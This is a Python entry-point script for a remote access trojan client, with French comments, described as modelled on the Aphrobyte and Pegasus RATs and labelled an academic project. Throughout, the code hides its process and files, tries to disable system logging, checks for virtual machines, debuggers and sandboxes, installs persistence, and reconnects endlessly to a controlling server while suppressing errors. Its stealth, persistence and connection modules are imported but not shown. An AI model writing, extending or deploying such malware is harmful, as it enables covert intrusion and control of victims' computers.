#!/usr/bin/env python3
"""
RAT Client - Point d'entrée principal
Inspiré de l'architecture des RATs Aphrobyte et Pegasus
"""

import sys
import os
import time
import argparse
from pathlib import Path

# Ajout du répertoire parent au path
sys.path.append(str(Path(__file__).parent.parent))

from client.core.client import RATClient
from client.utils.config import ClientConfig
from client.utils.stealth import StealthManager

def parse_arguments():
    """Parse les arguments de ligne de commande"""
    parser = argparse.ArgumentParser(description="RAT Client - Agent d'administration")
    parser.add_argument(
        '--server', 
        default='127.0.0.1', 
        help='Adresse du serveur (défaut: 127.0.0.1)'
    )
    parser.add_argument(
        '--port', 
        type=int, 
        default=8888, 
        help='Port du serveur (défaut: 8888)'
    )
    parser.add_argument(
        '--ssl', 
        action='store_true', 
        help='Utiliser SSL/TLS'
    )
    parser.add_argument(
        '--stealth', 
        action='store_true', 
        help='Mode furtif (masquer processus)'
    )
    parser.add_argument(
        '--persistent', 
        action='store_true', 
        help='Installer la persistance'
    )
    parser.add_argument(
        '--reconnect-delay', 
        type=int, 
        default=5, 
        help='Délai de reconnexion (défaut: 5s)'
    )
    parser.add_argument(
        '--debug', 
        action='store_true', 
        help='Mode debug'
    )
    return parser.parse_args()

def setup_stealth_mode():
    """Configure le mode furtif"""
    try:
        stealth = StealthManager()
        
        # Masquage du processus
        stealth.hide_process()
        
        # Masquage des fichiers
        stealth.hide_files()
        
        # Désactivation des logs système (si possible)
        stealth.disable_logging()
        
        return True
    except Exception:
        return False

def check_environment():
    """Vérifie l'environnement d'exécution"""
    # Vérifications de sécurité de base
    checks = {
        'vm_detection': False,
        'debugger_detection': False,
        'sandbox_detection': False
    }
    
    try:
        # Détection de machine virtuelle (basique)
        import platform
        system_info = platform.platform().lower()
        vm_indicators = ['virtualbox', 'vmware', 'qemu', 'xen']
        checks['vm_detection'] = any(indicator in system_info for indicator in vm_indicators)
        
        # Détection de debugger (basique)
        import ctypes
        if sys.platform == 'win32':
            checks['debugger_detection'] = ctypes.windll.kernel32.IsDebuggerPresent()
        
        # Détection de sandbox (basique)
        checks['sandbox_detection'] = os.path.exists('/tmp/sandbox') or os.path.exists('C:\\sandbox')
        
    except:
        pass
    
    return checks

def main():
    """Fonction principale du client"""
    # Parse des arguments
    args = parse_arguments()
    
    # Configuration
    config = ClientConfig()
    config.SERVER_HOST = args.server
    config.SERVER_PORT = args.port
    config.USE_SSL = args.ssl
    config.STEALTH_MODE = args.stealth
    config.PERSISTENT = args.persistent
    config.RECONNECT_DELAY = args.reconnect_delay
    config.DEBUG = args.debug
    
    # Mode furtif si demandé
    if config.STEALTH_MODE:
        if not setup_stealth_mode():
            if config.DEBUG:
                print("[!] Impossible d'activer le mode furtif")
    
    # Vérifications d'environnement
    if not config.DEBUG:
        env_checks = check_environment()
        # En mode production, on pourrait vouloir éviter certains environnements
        # For educational purposes, we continue regardless
    
    # Création du client
    client = RATClient(config)
    
    # Boucle principale avec reconnexion automatique
    attempt = 0
    max_attempts = config.MAX_RECONNECT_ATTEMPTS if not config.PERSISTENT else -1
    
    while True:
        try:
            attempt += 1
            
            if config.DEBUG:
                print(f"[*] Tentative de connexion #{attempt}")
                print(f"[*] Serveur: {config.SERVER_HOST}:{config.SERVER_PORT}")
            
            # Tentative de connexion
            client.connect()
            
            # Si on arrive ici, la connexion s'est terminée normalement
            if config.DEBUG:
                print("[*] Connexion fermée par le serveur")
            
            # Reset du compteur en cas de connexion réussie
            attempt = 0
            
        except KeyboardInterrupt:
            if config.DEBUG:
                print("\\n[*] Arrêt demandé par l'utilisateur")
            break
            
        except Exception as e:
            if config.DEBUG:
                print(f"[!] Erreur de connexion: {e}")
            
            # Vérification du nombre max de tentatives
            if max_attempts > 0 and attempt >= max_attempts:
                if config.DEBUG:
                    print(f"[!] Nombre maximum de tentatives atteint ({max_attempts})")
                break
        
        # Délai avant reconnexion
        if config.DEBUG:
            print(f"[*] Reconnexion dans {config.RECONNECT_DELAY}s...")
        
        time.sleep(config.RECONNECT_DELAY)
    
    if config.DEBUG:
        print("[*] Client arrêté")

def install_mode():
    """Mode d'installation pour la persistance"""
    try:
        from client.core.persistence import PersistenceManager
        
        persistence = PersistenceManager()
        
        if persistence.install():
            print("[+] Installation réussie")
            return True
        else:
            print("[!] Échec de l'installation")
            return False
            
    except ImportError:
        print("[!] Module de persistance non disponible")
        return False
    except Exception as e:
        print(f"[!] Erreur lors de l'installation: {e}")
        return False

def uninstall_mode():
    """Mode de désinstallation"""
    try:
        from client.core.persistence import PersistenceManager
        
        persistence = PersistenceManager()
        
        if persistence.uninstall():
            print("[+] Désinstallation réussie")
            return True
        else:
            print("[!] Échec de la désinstallation")
            return False
            
    except ImportError:
        print("[!] Module de persistance non disponible")
        return False
    except Exception as e:
        print(f"[!] Erreur lors de la désinstallation: {e}")
        return False

if __name__ == "__main__":
    # Vérification des modes spéciaux
    if len(sys.argv) > 1:
        if sys.argv[1] == '--install':
            sys.exit(0 if install_mode() else 1)
        elif sys.argv[1] == '--uninstall':
            sys.exit(0 if uninstall_mode() else 1)
        elif sys.argv[1] == '--version':
            print("RAT Client v1.0 - Projet académique")
            sys.exit(0)
    
    try:
        main()
    except Exception as e:
        # En mode production, on évite d'afficher les erreurs
        if '--debug' in sys.argv:
            raise
        else:
            # Log silencieux de l'erreur
            pass